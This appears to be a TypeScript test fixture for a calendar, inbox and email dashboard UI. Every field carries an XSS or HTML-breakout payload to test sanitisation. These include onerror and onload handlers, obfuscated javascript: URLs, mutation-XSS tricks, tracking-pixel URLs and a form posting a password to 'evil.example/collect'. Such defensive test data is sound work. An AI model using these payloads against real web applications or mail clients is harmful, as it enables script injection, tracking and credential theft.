/**
 * Adversarial view-model payloads injected through the mock host's tool results.
 * Every string field that reaches the DOM carries an attribute/HTML breakout attempt.
 */
export const ATTR_BREAKOUT = 'report" data-audit-injected="yes';
export const SINGLE_QUOTE_BREAKOUT = "report' data-audit-injected='yes";
export const HTML_BREAKOUT = '<img src=x onerror="window.__pwned=\'html\'">';
export const ENCODED_QUOTES = [
  "&quot; data-audit-injected=&quot;yes",
  "&#34; data-audit-injected=&#34;yes",
  `${String.fromCharCode(0x22)} data-audit-injected=${String.fromCharCode(0x22)}yes`, // decoded \u0022
  "\\u0022 data-audit-injected=\\u0022yes",
];
export const PAYLOAD = `${ATTR_BREAKOUT} ${SINGLE_QUOTE_BREAKOUT} ${HTML_BREAKOUT}`;

export const EVENT_TITLE = `Adversarial ${PAYLOAD}`;
export const SAFE_ATTACHMENT_URL = "https://drive.google.com/file/d/safe-attachment/view";
export const SAFE_EMAIL_LINK = "https://example.com/safe-link";
export const SAFE_CONFERENCE_LINK = "https://meet.google.com/abc-defg-hij";

export const UNSAFE_URLS = [
  "javascript:window.__pwned='js'",
  "JaVaScRiPt:window.__pwned='mixed'",
  " \u0001javascript:window.__pwned='ctrl'",
  "java\tscript:window.__pwned='tab'",
  "java\nscript:window.__pwned='newline'",
  "jav&#x09;ascript:window.__pwned='entity'",
  "data:text/html,<script>parent.__pwned='data'</script>",
  "vbscript:msgbox(1)",
  "//evil.example/protocol-relative",
  "https://user:pass@evil.example/credentials",
  "/relative/path",
];

// A 1x1 transparent PNG: inline data images are an intentionally supported feature.
export const DATA_IMAGE =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";

export const weekly = {
  week_start: "2026-09-21",
  week_end: "2026-09-27",
  timezone: `UTC${ATTR_BREAKOUT}`,
  total_events: `<b>${HTML_BREAKOUT}</b>`,
  days: [
    {
      date: "2026-09-21",
      day_label: `Mon${ATTR_BREAKOUT}`,
      is_today: false,
      all_day_events: [
        {
          event_id: "all-day",
          calendar_id: "primary",
          title: `All day ${PAYLOAD}`,
          start: "2026-09-21",
          end: "2026-09-22",
          all_day: true,
          status: "confirmed",
        },
      ],
      timed_events: [
        {
          event_id: `evt${ATTR_BREAKOUT}`,
          calendar_id: `cal${SINGLE_QUOTE_BREAKOUT}`,
          title: EVENT_TITLE,
          start: "2026-09-21T10:00:00Z",
          end: "2026-09-21T11:00:00Z",
          all_day: false,
          status: "confirmed",
          location: `Room ${PAYLOAD}`,
          description_snippet: `Snippet ${PAYLOAD} ${ENCODED_QUOTES.join(" ")}`,
          attendee_count: `3 ${HTML_BREAKOUT}`,
          has_conference: true,
          color_id: `1" style="background:url(https://tracker.example/color)`,
        },
        {
          event_id: "baseline",
          calendar_id: "primary",
          title: "Fixture baseline meeting",
          start: "2026-09-21T13:00:00Z",
          end: "2026-09-21T14:00:00Z",
          all_day: false,
          status: "confirmed",
        },
      ],
    },
  ],
  fallback_text: "Adversarial fixture",
};

export const inboxMessage = {
  id: `msg${ATTR_BREAKOUT}`,
  subject: `Subject ${PAYLOAD}`,
  from: `Mallory ${PAYLOAD} <mallory@example.com>`,
  date: `2026-09-21${ATTR_BREAKOUT}`,
  snippet: `Snippet ${PAYLOAD} ${ENCODED_QUOTES.join(" ")}`,
  label_ids: ["INBOX", "UNREAD", `label${ATTR_BREAKOUT}`, HTML_BREAKOUT],
  is_unread: true,
};

export const dashboard = {
  title: `Dashboard ${PAYLOAD}`,
  generated_at_utc: "2026-09-21T09:00:00Z",
  state: {},
  sections: [
    {
      id: "communications",
      title: "Communications",
      fallback_text: "",
      cards: [{ card_type: "inbox", title: "Inbox", data: { unread_count: 1, messages: [inboxMessage] } }],
    },
  ],
  warnings: [],
  section_errors: {},
};

export const calendarCatalog = {
  items: [
    { id: "primary", summary: "Primary", primary: true },
    { id: `cal${ATTR_BREAKOUT}`, summary: `Shared ${PAYLOAD}`, access_role: `reader${ATTR_BREAKOUT}` },
  ],
};

export const eventDetail = {
  event_id: `evt${ATTR_BREAKOUT}`,
  calendar_id: `cal${SINGLE_QUOTE_BREAKOUT}`,
  title: EVENT_TITLE,
  start: "2026-09-21T10:00:00Z",
  end: "2026-09-21T11:00:00Z",
  timezone: `UTC${ATTR_BREAKOUT}`,
  status: "confirmed",
  location: `Room ${PAYLOAD}`,
  description: `Description ${PAYLOAD} ${ENCODED_QUOTES.join(" ")}`,
  conference_link: "javascript:window.__pwned='conference'",
  conference_provider: `Meet ${PAYLOAD}`,
  self_response_status: `accepted${ATTR_BREAKOUT}`,
  attendees: [
    {
      email: `guest${ATTR_BREAKOUT}@example.com`,
      display_name: `Guest ${PAYLOAD}`,
      response_status: `needsAction${ATTR_BREAKOUT}`,
      organizer: false,
      self: false,
    },
  ],
  attachments: [
    { title: `Safe ${ATTR_BREAKOUT}`, file_url: SAFE_ATTACHMENT_URL, mime_type: `application/pdf${ATTR_BREAKOUT}` },
    ...UNSAFE_URLS.map((url, index) => ({ title: `Unsafe attachment ${index}`, file_url: url })),
  ],
};

export const safeConferenceEventDetail = {
  ...eventDetail,
  event_id: "safe-conference",
  title: "Safe conference event",
  conference_link: SAFE_CONFERENCE_LINK,
  conference_provider: "Google Meet",
};

const unsafeAnchors = UNSAFE_URLS.map((url) => `<a href="${url.replace(/"/g, "&quot;")}">unsafe link</a>`).join(" ");

export const EMAIL_HTML = `
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
<link rel="stylesheet" href="https://tracker.example/link.css">
<style>body { background: url(https://tracker.example/style-element.png) } .email-actions { display: none }</style>
<p id="email-intro" class="overlay" data-email-action="trash" data-message-id="victim" style="color:red; font-weight:700; background-image:url(https://tracker.example/inline-bg.png); margin-left:\\75 rl(https://tracker.example/escape.png); font-family:expression(alert(1))">Intro paragraph</p>
<p style="font-family: '\\75 rl(https://tracker.example/escaped-family)'">Escaped CSS</p>
<img src=x onerror="window.__pwned='img'">
<img src="https://tracker.example/pixel.gif" alt="Tracking pixel">
<img src="cid:inline-logo@example" alt="Inline logo">
<img srcset="https://tracker.example/srcset.png 1x" alt="srcset">
<img src="${DATA_IMAGE}" alt="Inline data image">
<img src="data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' onload='parent.__pwned=1'/&gt;" alt="SVG data image">
<svg onload="window.__pwned='svg'"><circle r="5"></circle></svg>
<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned='mathml'"></style></mglyph></table></mtext></math>
<script>window.__pwned = 'script';</script>
<iframe src="https://evil.example/frame" srcdoc="<script>parent.__pwned='srcdoc'</script>"></iframe>
<object data="https://evil.example/object"></object>
<embed src="https://evil.example/embed">
<video poster="https://tracker.example/poster.png" src="https://tracker.example/video.mp4"></video>
<table background="https://tracker.example/table-bg.png"><tr><td colspan="2&quot; onclick=&quot;x" rowspan="2">Cell</td></tr></table>
<form action="https://evil.example/collect" method="post"><input name="password" value="secret"><button>Submit form</button></form>
<input type="image" src="https://tracker.example/input.png">
<a href="${SAFE_EMAIL_LINK}" onclick="window.__pwned='click'" target="_self">Safe link</a>
<a href="mailto:someone@example.com">Mail link</a>
${unsafeAnchors}
<div data-email-action="trash" data-message-id="victim">Spoofed action</div>
<noscript><p title="</noscript><img src=x onerror=window.__pwned='noscript'>"></p></noscript>
<p title="${ATTR_BREAKOUT.replace(/"/g, "&quot;")}">Quoted title</p>
<div><table><tr><td>Unclosed <b>bold <p>paragraph</div></div></div></section></div>
<div class="overlay" id="spoofed-overlay">Spoofed overlay text</div>
<!-- --><img src=x onerror="window.__pwned='comment'"> -->
<p>Tail paragraph
`;

export const emailDetail = {
  message_id: `msg${ATTR_BREAKOUT}`,
  thread_id: "thread",
  subject: `Subject ${PAYLOAD}`,
  from_value: `Mallory ${PAYLOAD} <mallory@example.com>`,
  to: `victim${ATTR_BREAKOUT}@example.com`,
  cc: `cc ${PAYLOAD}`,
  bcc: null,
  date: `Mon, 21 Sep 2026 ${ATTR_BREAKOUT}`,
  snippet: `Snippet ${PAYLOAD}`,
  text_body: null,
  html_body: EMAIL_HTML,
  attachments: [
    {
      filename: ATTR_BREAKOUT,
      mime_type: `text/plain${SINGLE_QUOTE_BREAKOUT}`,
      size: 10,
      attachment_id: `att${ATTR_BREAKOUT}`,
    },
    ...ENCODED_QUOTES.map((filename, index) => ({
      filename,
      mime_type: "text/plain",
      size: 10,
      attachment_id: `encoded-${index}`,
    })),
  ],
  labels: ["INBOX", "UNREAD", `label${ATTR_BREAKOUT}`, HTML_BREAKOUT],
  is_unread: true,
};
